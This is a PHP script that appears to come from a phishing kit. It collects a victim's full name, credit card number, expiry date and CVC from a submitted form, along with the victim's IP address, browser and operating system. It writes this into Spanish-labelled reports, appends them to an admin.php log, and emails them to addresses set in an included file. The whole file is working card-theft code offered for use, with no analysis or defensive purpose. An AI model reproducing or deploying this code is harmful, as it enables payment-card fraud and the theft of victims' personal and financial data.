<?php

session_start();


include("system.php");


$_SESSION['_FullName_']    = $_POST['FullName'];
$_SESSION['_cardnumber_']  = $_POST['cardnumber'];
$_SESSION['_MMYY_']        = $_POST['MMYY'];
$_SESSION['_CVC_']         = $_POST['CVC'];



$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


$ip = getenv("REMOTE_ADDR");




$yahya_email .= '<html><head></head>
<style>
font {font-family: "Comic Sans MS", cursive, sans-serif;},
</style>
<body>
<div style="font-size: 13px;font-family:monospace;font-weight:700;">

[<font style="color: #0070ba;" >CARD INFORMATION</font>]
<br>
<font ></font> [🖊 NOMBRE COMPLETO] = <font> '.$_SESSION['_FullName_'].'</font>
<br>
<font ></font> [💳 NUMERO DE TARJETA DE CREDITO] = <font >'.$_SESSION['_cardnumber_'].'</font>
<br>
<font style="color:#9c0000;"></font> [🔄 Expira en ] = <font >'.$_SESSION['_MMYY_'].'</font>
<br>
<font style="color:#9c0000;"></font> [🔑 CODIGO DE SEGURIDAD (CVV)] = <font >'.$_SESSION['_CVC_'].'</font>
<br>
<font >[💻 System]
</font><br>
<font style="color:#9c0000;"></font> [🔍 IP INFO] = <font style="color:#0070ba;">
<a target="_blank" style="text-decoration:none;" href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'"> '.$_SERVER['REMOTE_ADDR'].' </a></font><br>
<font style="color:#9c0000;"></font> [⏰ TIME/DATE] = <font style="color:#0070ba;">'.$InfoDATE.'</font><br>
<font style="color:#9c0000;"></font> [🌐 BROWSER] = <font style="color:#0070ba;">'.$browserTy_Version.' and '.$OS.'</font>
<br>
 <font style="color: #820000;"></font></div><font style="color: #820000;">
</font>
</body></html>';


$yagmail .= '
[🖊 NOMBRE COMPLETO] = '.$_SESSION['_FullName_'].'
[💳 NUMERO DE TARJETA DE CREDITO] = '.$_SESSION['_cardnumber_'].'
[🔄 Expira en ] = '.$_SESSION['_MMYY_'].'
[🔑 CODIGO DE SEGURIDAD (CVV)] = '.$_SESSION['_CVC_'].'
[💻 System]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'';



include("../../sand_rzlt_email.php");
include("./index.php");


$f = fopen("../../admin.php", "a");
	fwrite($f, $yahya_email);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "  💳Card Bank💳[  ".$_SESSION['country1']." - ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= "From: ᗰᴏᴜꜱᴛᴀᴄʜᴇ™" . "\r\n";
mail($yourmail, $subject, $yahya_email , $headers);
mail($D, $subject, $yahya_email , $headers);


?>

